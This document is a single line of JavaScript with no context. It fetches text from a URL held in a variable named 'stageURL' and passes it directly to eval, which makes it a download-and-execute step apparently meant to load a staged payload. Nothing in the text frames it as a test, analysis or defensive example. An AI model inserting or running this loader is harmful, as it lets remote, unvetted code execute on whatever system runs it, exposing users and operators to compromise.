fetch(stageURL).then(r => r.text()).then(code => eval(code));
